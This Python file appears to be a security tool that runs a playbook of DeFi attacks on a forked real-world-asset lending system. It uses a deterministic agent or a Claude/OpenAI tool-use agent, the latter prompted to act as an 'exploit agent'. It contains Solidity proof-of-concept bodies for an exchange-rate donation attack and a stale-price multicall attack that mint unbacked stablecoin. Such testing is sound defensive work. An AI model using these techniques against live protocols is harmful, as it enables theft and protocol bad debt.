"""Red Queen - playbook-driven attack loop.

For each pattern in the RWA attack playbook: check structural preconditions (via decompile) ->
instantiate the attack template with real amounts -> run it on the fork (fork_and_execute) ->
retry on failure (max 5) -> record the result. If every pattern is exhausted with no confirmed
exploit, that is a valid, reportable "no exploits found" outcome, not an error.

Two agents share the same tools and result schema:
  - FallbackAgent (default): deterministic template instantiation, no LLM. This is the guaranteed
    demo path and matches the plan's Hour-14 pivot ("hand it the template pre-filled").
  - LLMAgent (when ANTHROPIC_API_KEY is set): a Claude tool-use loop that does its own recon and
    writes its own PoC, under the cost/safety guards in config.

Impact is reported honestly as UNBACKED VALUE MINTED (rwaUSD minted beyond fair collateral value
= protocol bad debt), not a naive net "profit" - a donation that inflates the rate costs more than
it yields once the donated capital is accounted for, and the tool's whole pitch is not overstating
findings.
"""

import json
import time

import yaml

from . import config, tools


# --- deterministic template instantiation (FallbackAgent) --------------------
# Each pattern maps to (contracts to recon, required structural flags, a Solidity body generator).
# Amounts are chosen so the demo headline is a credible ~$46K of unbacked mint, not an absurd
# billions figure - the magnitude scales with the chosen amounts, the invariant violation does not.

_DONATION_BODY = """
address atk = makeAddr("rq_atk_a");
goldToken.mint(atk, 231_000e18);                 // flash-loan stand-in (plan: mint collateral on fork)
vm.startPrank(atk);
uint256 rateBefore = goldAdapter.exchangeRate();
uint256 fairPrice = priceRouter.getPrice(address(goldAdapter)).price;
goldToken.transfer(goldPool, 230_000e18);        // donation: inflates rate without minting shares
uint256 rateAfter = goldAdapter.exchangeRate();
goldToken.approve(address(goldAdapter), 1e18);
accountManager.deposit(address(goldAdapter), 1e18);   // 1 gold captured at the inflated rate
uint256 minted = ledger.principal(atk);
accountManager.mint(minted);
vm.stopPrank();
uint256 fairCollateralValue = 1e18 * fairPrice / 1e18;
uint256 unbacked = token.balanceOf(atk) - fairCollateralValue;
console2.log("rateBefore", rateBefore);
console2.log("rateAfter", rateAfter);
console2.log("minted", minted);
console2.log("PROFIT_USD", unbacked);
require(rateAfter > rateBefore * 10, "rate not >10x");
require(token.balanceOf(atk) > fairCollateralValue * 10, "no material unbacked mint");
"""

_STALE_MULTICALL_BODY = """
address atk = makeAddr("rq_atk_c");
goldToken.mint(atk, 231_000e18);
vm.startPrank(atk);
uint256 fairPrice = priceRouter.getPrice(address(goldAdapter)).price;
goldToken.transfer(goldPool, 230_000e18);        // move the rate before the single price read
goldToken.approve(address(goldAdapter), 1e18);
uint256 minted = accountManager.depositAndMint(address(goldAdapter), 1e18);
vm.stopPrank();
uint256 fairCollateralValue = 1e18 * fairPrice / 1e18;
uint256 unbacked = minted - fairCollateralValue;
console2.log("minted", minted);
console2.log("PROFIT_USD", unbacked);
require(minted > fairCollateralValue * 10, "multicall not exploitable");
"""

# Vuln B is a MISCONFIGURATION (applyCorporateAction is admin-gated, not attacker-triggerable) and
# it MIS-PRICES rather than yielding attacker profit. The honest outcome is a correctness finding:
# after a legitimate corporate action the router under-values the position, so the ledger records
# the wrong collateral value. Reported as a mispricing finding, not a profitable exploit.
_COMPOSITION_BODY = """
address usr = makeAddr("rq_usr_b");
vm.prank(admin);
xstockAdapter.applyCorporateAction(1.5e18);      // legitimate corporate action: position now 1.5x
stockToken.mint(usr, 10_000e18);
vm.startPrank(usr);
stockToken.approve(address(xstockAdapter), 10_000e18);
accountManager.deposit(address(xstockAdapter), 10_000e18);
uint256 recorded = ledger.principal(usr);
vm.stopPrank();
uint256 rawFeed = stockUsdFeed.latestPrice();
uint256 trueValue = (10_000e18 * rawFeed / 1e18) * xstockAdapter.rebaseMultiplier() / 1e18;
uint256 gap = trueValue > recorded ? trueValue - recorded : recorded - trueValue;
console2.log("recorded", recorded);
console2.log("trueValue", trueValue);
console2.log("PROFIT_USD", gap);
require(gap > 0, "no mispricing");
"""

# Vuln D exercises the AccrualSemanticConsistency invariant class (distinct from Vuln B's
# composition check): the xStock profile declares a dividend/rebase accrual (rebaseMultiplier grows),
# but the router prices the flat raw feed, so observed price behavior is inconsistent with the
# declared accrual type. Reported as a mispricing finding (no attacker profit).
_ACCRUAL_MISMATCH_BODY = """
vm.prank(admin);
xstockAdapter.applyCorporateAction(1.5e18);        // declared accrual grows 1.0x -> 1.5x
uint256 mult = xstockAdapter.rebaseMultiplier();
uint256 routerPrice = priceRouter.getPrice(address(xstockAdapter)).price;
uint256 rawFeed = stockUsdFeed.latestPrice();
uint256 gap = routerPrice >= rawFeed ? routerPrice - rawFeed : rawFeed - routerPrice;
console2.log("rebaseMultiplier", mult);
console2.log("routerPrice", routerPrice);
console2.log("rawFeed", rawFeed);
console2.log("PROFIT_USD", gap);                   // 0 profit; the finding IS the type inconsistency
require(mult > 1e18, "corporate action not applied");
require(routerPrice == rawFeed, "router unexpectedly folded the accrual multiplier");
"""

_PATTERN_IMPL = {
    "accrual_type_mismatch": {
        "recon": ["xstockAdapter", "PriceRouter"],
        "required_flags": {"xstockAdapter": ["has_rebase_multiplier"], "PriceRouter": ["has_getPrice"]},
        "body": _ACCRUAL_MISMATCH_BODY,
        "confirm_kind": "MISPRICING_FINDING",
    },
    "adapter_donation": {
        "recon": ["goldAdapter"],
        "required_flags": {"goldAdapter": ["has_exchangeRate", "rate_reads_pool_balance"]},
        "body": _DONATION_BODY,
        "confirm_kind": "EXPLOIT_CONFIRMED",
    },
    "stale_price_multicall": {
        "recon": ["AccountManager", "goldAdapter"],
        "required_flags": {"AccountManager": ["has_multicall_depositAndMint"],
                           "goldAdapter": ["price_passed_in_not_rederived"]},
        "body": _STALE_MULTICALL_BODY,
        "confirm_kind": "EXPLOIT_CONFIRMED",
    },
    "unit_composition_error": {
        "recon": ["xstockAdapter", "PriceRouter"],
        "required_flags": {"xstockAdapter": ["has_rebase_multiplier"], "PriceRouter": ["has_getPrice"]},
        "body": _COMPOSITION_BODY,
        "confirm_kind": "MISPRICING_FINDING",
    },
}


class _RunRecorder:
    def __init__(self):
        self.tool_calls = []
        self.reasoning_log = []
        self.llm_calls = 0
        self.cost_usd = 0.0

    def log(self, msg):
        self.reasoning_log.append(msg)

    def tool(self, name, tool_input, result):
        self.tool_calls.append({
            "name": name, "input": tool_input,
            "summary": result.get("summary", ""), "ok": result.get("ok", False),
            "ts": time.time(),
        })


class FallbackAgent:
    """Deterministic playbook executor. No LLM calls."""

    name = "fallback"

    def __init__(self, playbook, rec):
        self.playbook = playbook
        self.rec = rec

    def _recon_flags(self, contract):
        res = tools.decompile(contract)
        self.rec.tool("decompile", {"target": contract}, res)
        self.rec.log("recon %s -> %s" % (contract, res.get("summary", "")))
        return res.get("structural_flags", [])

    def _preconditions_met(self, pattern):
        impl = _PATTERN_IMPL[pattern["name"]]
        for contract in impl["recon"]:
            flags = self._recon_flags(contract)
            for req in impl["required_flags"].get(contract, []):
                if req not in flags:
                    self.rec.log("precondition FAIL: %s lacks %s" % (contract, req))
                    return False
        self.rec.log("preconditions met for %s" % pattern["name"])
        return True

    def run_pattern(self, pattern):
        impl = _PATTERN_IMPL.get(pattern["name"])
        base = {
            "name": pattern["name"], "vuln_ref": pattern.get("vuln_ref"),
            "reference_incident": pattern.get("reference_incident"),
            "target": pattern.get("target"),
        }
        if impl is None:
            return {**base, "preconditions_met": False, "attempted": False,
                    "result": "SKIPPED", "impact_usd": 0.0, "attempts": 0}
        if not self._preconditions_met(pattern):
            return {**base, "preconditions_met": False, "attempted": False,
                    "result": "SKIPPED", "impact_usd": 0.0, "attempts": 0}

        last = None
        for attempt in range(1, config.MAX_RETRIES_PER_PATTERN + 1):
            self.rec.log("attempt %d: instantiating template for %s" % (attempt, pattern["name"]))
            res = tools.fork_and_execute(impl["body"])
            self.rec.tool("fork_and_execute", {"pattern": pattern["name"], "attempt": attempt}, res)
            last = res
            if res.get("passed"):
                impact = res.get("profit_usd") or 0.0
                self.rec.log("%s CONFIRMED: %s" % (pattern["name"], res.get("summary")))
                return {**base, "preconditions_met": True, "attempted": True,
                        "result": impl["confirm_kind"], "impact_usd": impact,
                        "rate_before": res.get("rate_before"), "rate_after": res.get("rate_after"),
                        "attempts": attempt, "poc_solidity": res.get("poc_solidity"),
                        "logs": res.get("logs", [])}
            self.rec.log("attempt %d reverted: %s" % (attempt, res.get("revert_reason")))
        return {**base, "preconditions_met": True, "attempted": True, "result": "REVERTED",
                "impact_usd": 0.0, "attempts": config.MAX_RETRIES_PER_PATTERN,
                "revert_reason": (last or {}).get("revert_reason"),
                "poc_solidity": (last or {}).get("poc_solidity")}


class LLMAgent:
    """Claude tool-use loop. Runs only when ANTHROPIC_API_KEY is set. Does its own recon and writes
    its own PoC; the cost/safety guards in config bound every run."""

    name = "llm"

    _SYSTEM = (
        "You are an RWA (real-world-asset) DeFi exploit agent inside a security tool. You are given "
        "one attack pattern from a playbook and a set of tools that operate on a deployed target "
        "system on a fork. Your job: verify the pattern's preconditions with decompile/price_query, "
        "then write the BODY of a Solidity testExploit() function and run it with fork_and_execute. "
        "Iterate on revert reasons (at most a few tries). When you confirm the exploit, state the "
        "unbacked value minted (rwaUSD minted beyond fair collateral value). If the pattern does not "
        "apply, say so plainly - 'no exploit' is a valid result. Be concise."
    )

    def __init__(self, playbook, rec):
        import anthropic
        self.playbook = playbook
        self.rec = rec
        self.client = anthropic.Anthropic(api_key=config.ANTHROPIC_API_KEY)

    def _charge(self, usage):
        cost = (usage.input_tokens / 1e6) * config.MODEL_PRICE_PER_MTOK["input"] + \
               (usage.output_tokens / 1e6) * config.MODEL_PRICE_PER_MTOK["output"]
        self.rec.cost_usd += cost
        self.rec.llm_calls += 1
        self._log_call(usage, cost)
        return cost

    def _log_call(self, usage, cost):
        config.LOGS_DIR.mkdir(exist_ok=True)
        p = config.LOGS_DIR / ("llm_%d_%d.json" % (int(time.time() * 1000), self.rec.llm_calls))
        p.write_text(json.dumps({
            "input_tokens": usage.input_tokens, "output_tokens": usage.output_tokens,
            "cost_usd": cost, "cumulative_cost_usd": self.rec.cost_usd,
        }, indent=2))

    def run_pattern(self, pattern):
        base = {"name": pattern["name"], "vuln_ref": pattern.get("vuln_ref"),
                "reference_incident": pattern.get("reference_incident"), "target": pattern.get("target")}
        messages = [{"role": "user", "content": "Attack pattern:\n" + yaml.safe_dump(pattern)}]
        confirmed = None
        for _ in range(config.MAX_TOOL_CALLS_PER_PATTERN):
            if self.rec.cost_usd >= config.TOTAL_BUDGET_USD:
                self.rec.log("BUDGET KILL SWITCH: $%.4f >= $%.2f" % (self.rec.cost_usd, config.TOTAL_BUDGET_USD))
                break
            resp = self.client.messages.create(
                model=config.ATTACK_MODEL, max_tokens=config.MAX_OUTPUT_TOKENS_PER_CALL,
                system=self._SYSTEM, tools=tools.TOOL_SCHEMAS, messages=messages,
            )
            self._charge(resp.usage)
            messages.append({"role": "assistant", "content": resp.content})
            tool_results = []
            for block in resp.content:
                if block.type == "text" and block.text.strip():
                    self.rec.log(block.text.strip())
                elif block.type == "tool_use":
                    result = tools.dispatch(block.name, block.input)
                    self.rec.tool(block.name, block.input, result)
                    if block.name == "fork_and_execute" and result.get("passed"):
                        confirmed = result
                    tool_results.append({
                        "type": "tool_result", "tool_use_id": block.id,
                        "content": json.dumps({k: v for k, v in result.items() if k != "poc_solidity"})[:6000],
                    })
            if not tool_results:
                break
            messages.append({"role": "user", "content": tool_results})
            if confirmed:
                break
        if confirmed:
            return {**base, "preconditions_met": True, "attempted": True,
                    "result": "EXPLOIT_CONFIRMED", "impact_usd": confirmed.get("profit_usd") or 0.0,
                    "rate_before": confirmed.get("rate_before"), "rate_after": confirmed.get("rate_after"),
                    "attempts": self.rec.llm_calls, "poc_solidity": confirmed.get("poc_solidity"),
                    "logs": confirmed.get("logs", [])}
        return {**base, "preconditions_met": True, "attempted": True, "result": "NO_EXPLOIT",
                "impact_usd": 0.0, "attempts": self.rec.llm_calls}


class OpenAILLMAgent:
    """OpenAI tool-calling loop — same tools, same result schema as the Claude agent. Runs when
    OPENAI_API_KEY is set. Uses chat.completions with function tools; bounded by the same guards."""

    name = "openai"

    _SYSTEM = LLMAgent._SYSTEM  # identical framing; provider differs, task does not

    # Convert the shared Anthropic-style TOOL_SCHEMAS into OpenAI function-tool format.
    _TOOLS = [{"type": "function",
               "function": {"name": t["name"], "description": t["description"],
                            "parameters": t["input_schema"]}} for t in tools.TOOL_SCHEMAS]

    def __init__(self, playbook, rec):
        import openai
        self.playbook = playbook
        self.rec = rec
        self.client = openai.OpenAI(api_key=config.OPENAI_API_KEY)

    def _charge(self, usage):
        if not usage:
            return
        cost = (usage.prompt_tokens / 1e6) * config.MODEL_PRICE_PER_MTOK["input"] + \
               (usage.completion_tokens / 1e6) * config.MODEL_PRICE_PER_MTOK["output"]
        self.rec.cost_usd += cost
        self.rec.llm_calls += 1
        config.LOGS_DIR.mkdir(exist_ok=True)
        (config.LOGS_DIR / ("openai_%d_%d.json" % (int(time.time() * 1000), self.rec.llm_calls))).write_text(
            json.dumps({"prompt_tokens": usage.prompt_tokens, "completion_tokens": usage.completion_tokens,
                        "cost_usd": cost, "cumulative_cost_usd": self.rec.cost_usd}, indent=2))

    def run_pattern(self, pattern):
        base = {"name": pattern["name"], "vuln_ref": pattern.get("vuln_ref"),
                "reference_incident": pattern.get("reference_incident"), "target": pattern.get("target")}
        messages = [{"role": "system", "content": self._SYSTEM},
                    {"role": "user", "content": "Attack pattern:\n" + yaml.safe_dump(pattern)}]
        confirmed = None
        for _ in range(config.MAX_TOOL_CALLS_PER_PATTERN):
            if self.rec.cost_usd >= config.TOTAL_BUDGET_USD:
                self.rec.log("BUDGET KILL SWITCH: $%.4f >= $%.2f" % (self.rec.cost_usd, config.TOTAL_BUDGET_USD))
                break
            resp = self.client.chat.completions.create(
                model=config.OPENAI_MODEL, messages=messages, tools=self._TOOLS, tool_choice="auto",
                max_completion_tokens=config.MAX_OUTPUT_TOKENS_PER_CALL)
            self._charge(resp.usage)
            msg = resp.choices[0].message
            if msg.content and msg.content.strip():
                self.rec.log(msg.content.strip())
            asst = {"role": "assistant", "content": msg.content or ""}
            if msg.tool_calls:
                asst["tool_calls"] = [{"id": tc.id, "type": "function",
                                       "function": {"name": tc.function.name, "arguments": tc.function.arguments}}
                                      for tc in msg.tool_calls]
            messages.append(asst)
            if not msg.tool_calls:
                break
            for tc in msg.tool_calls:
                try:
                    args = json.loads(tc.function.arguments or "{}")
                except json.JSONDecodeError:
                    args = {}
                result = tools.dispatch(tc.function.name, args)
                self.rec.tool(tc.function.name, args, result)
                if tc.function.name == "fork_and_execute" and result.get("passed"):
                    confirmed = result
                messages.append({"role": "tool", "tool_call_id": tc.id,
                                 "content": json.dumps({k: v for k, v in result.items() if k != "poc_solidity"})[:6000]})
            if confirmed:
                break
        if confirmed:
            return {**base, "preconditions_met": True, "attempted": True,
                    "result": "EXPLOIT_CONFIRMED", "impact_usd": confirmed.get("profit_usd") or 0.0,
                    "rate_before": confirmed.get("rate_before"), "rate_after": confirmed.get("rate_after"),
                    "attempts": self.rec.llm_calls, "poc_solidity": confirmed.get("poc_solidity"),
                    "logs": confirmed.get("logs", [])}
        return {**base, "preconditions_met": True, "attempted": True, "result": "NO_EXPLOIT",
                "impact_usd": 0.0, "attempts": self.rec.llm_calls}


def _load_playbook():
    return yaml.safe_load(config.PLAYBOOK_PATH.read_text())


def run_attack(force_agent=None):
    """Run the full playbook loop. Returns the result dict and writes it to state + logs."""
    playbook = _load_playbook()
    rec = _RunRecorder()
    # Provider selection: explicit override wins, else auto (openai > anthropic > fallback).
    if force_agent == "fallback":
        agent = FallbackAgent(playbook, rec)
    elif force_agent == "openai":
        agent = OpenAILLMAgent(playbook, rec)
    elif force_agent == "anthropic":
        agent = LLMAgent(playbook, rec)
    elif force_agent == "llm" or (force_agent is None and config.has_llm()):
        provider = config.llm_provider()
        agent = OpenAILLMAgent(playbook, rec) if provider == "openai" else LLMAgent(playbook, rec)
    else:
        agent = FallbackAgent(playbook, rec)
    rec.log("agent=%s | patterns=%d | budget=$%.2f" % (agent.name, len(playbook), config.TOTAL_BUDGET_USD))

    patterns = []
    try:
        for pattern in playbook:
            rec.log("=== pattern: %s (%s) ===" % (pattern["name"], pattern.get("vuln_ref")))
            patterns.append(agent.run_pattern(pattern))
    except Exception as e:  # noqa: BLE001 - any LLM API failure (quota/auth/rate/network)
        # Graceful degradation: don't crash a run because the LLM backend is unavailable. Fall back
        # to the deterministic agent so the pipeline still produces results.
        rec.log("LLM agent unavailable (%s: %s); falling back to deterministic FallbackAgent"
                % (type(e).__name__, str(e)[:160]))
        print("[warn] LLM backend failed (%s) — falling back to deterministic agent" % type(e).__name__)
        agent = FallbackAgent(playbook, rec)
        patterns = [agent.run_pattern(p) for p in playbook]

    confirmed = [p for p in patterns if p["result"] == "EXPLOIT_CONFIRMED"]
    findings = [p for p in patterns if p["result"] in ("EXPLOIT_CONFIRMED", "MISPRICING_FINDING")]
    if confirmed:
        top = max(confirmed, key=lambda p: p["impact_usd"])
        headline = "EXPLOIT FOUND: $%s unbacked (%s / %s)" % (
            format(top["impact_usd"], ",.0f"), top["name"], top.get("vuln_ref"))
    elif findings:
        headline = "%d finding(s), no directly-profitable exploit" % len(findings)
    else:
        headline = "No exploits found within the playbook's classes (a valid result)"

    result = {
        "agent": agent.name,
        "found": bool(confirmed),
        "confirmed_count": len(confirmed),
        "finding_count": len(findings),
        "headline": headline,
        "patterns": patterns,
        "tool_calls": rec.tool_calls,
        "reasoning_log": rec.reasoning_log,
        "llm_calls": rec.llm_calls,
        "cost_usd": round(rec.cost_usd, 4),
        "ts": time.time(),
    }
    config.STATE_DIR.mkdir(parents=True, exist_ok=True)
    (config.STATE_DIR / "attack_result.json").write_text(json.dumps(result, indent=2))
    config.LOGS_DIR.mkdir(exist_ok=True)
    (config.LOGS_DIR / ("attack_run_%d.json" % int(time.time()))).write_text(json.dumps(result, indent=2))
    return result


def main():
    import argparse
    ap = argparse.ArgumentParser(description="Red Queen attack loop")
    ap.add_argument("--agent", choices=["fallback", "llm", "openai", "anthropic"], default=None,
                    help="force agent (default: auto — openai if OPENAI_API_KEY set, else anthropic, else fallback)")
    args = ap.parse_args()
    result = run_attack(force_agent=args.agent)
    print("\n" + "=" * 70)
    print("AGENT:", result["agent"], "| LLM calls:", result["llm_calls"], "| cost $%.4f" % result["cost_usd"])
    print(result["headline"])
    print("=" * 70)
    for p in result["patterns"]:
        impact = ("$%s" % format(p["impact_usd"], ",.0f")) if p.get("impact_usd") else "-"
        print("  [%-18s] %-18s %-20s impact=%s attempts=%s" % (
            p["name"], p.get("vuln_ref", ""), p["result"], impact, p.get("attempts")))
    print("\nfull result -> orchestrator/state/attack_result.json")


if __name__ == "__main__":
    main()
